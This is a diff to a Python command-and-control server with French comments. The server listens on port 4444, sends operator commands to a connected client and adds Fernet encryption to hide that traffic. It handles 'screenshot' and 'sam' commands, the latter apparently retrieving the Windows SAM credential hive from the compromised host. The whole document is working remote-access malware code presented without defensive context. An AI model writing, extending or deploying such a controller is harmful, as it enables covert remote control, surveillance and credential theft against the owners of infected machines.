@@ -2,10 +2,22 @@ import socket
 import os
 import sys
 import threading
+from cryptography.fernet import Fernet 
 
 # On definit l'adresse et le port
 HOST = "0.0.0.0"
 PORT = 4444
+
+
+# On charge la cle generee par le script generate_key.py
+try:
+    with open("secret.key", "rb") as key_file:
+        KEY = key_file.read()
+    cipher = Fernet(KEY)
+except FileNotFoundError:
+    print("[-] Fichier secret.key introuvable. Generez-le avec generate_key.py")
+    sys.exit(1)
+
 
 def gerer_client(conn, addr):
     print(f"[+] Nouvelle connexion depuis {addr}")
@@ -29,9 +41,11 @@ def gerer_client(conn, addr):
             if cmd.lower() in ['exit', 'quit']:
                 conn.send(b"exit")
                 break
+            
+            cmd_encrypted = cipher.encrypt(cmd.encode("utf-8"))
                 
             # On envoie la commande au client
-            conn.send(cmd.encode("utf-8"))
+            conn.send(cmd_encrypted)
             
             # 2. Gestion des commandes qui renvoient des fichiers binaires
             if cmd in ["screenshot", "sam"]:
@@ -50,14 +64,18 @@ def gerer_client(conn, addr):
                     print("[-] Erreur : aucune donnee recue.")
             else:
                 # 3. Comportement normal pour les commandes texte
-                reponse = conn.recv(4096).decode("utf-8")
-                if not reponse:
+                reponse_encrypted = conn.recv(4096)
+                if not reponse_encrypted:
                     print("[-] Le client a ferme la connexion.")
                     break
-                print(reponse)
+                    
                 
-    except Exception as e:
-        print(f"[-] Erreur avec le client : {e}")
+                try:
+                    reponse = cipher.decrypt(reponse_encrypted).decode("utf-8")
+                    print(reponse)
+                
+                except Exception as e:
+                    print(f"[-] Erreur de dechiffrement (le client est-il a jour ?) : {e}")
     finally:
         conn.close()
         print(f"[-] Deconnexion de {addr}")
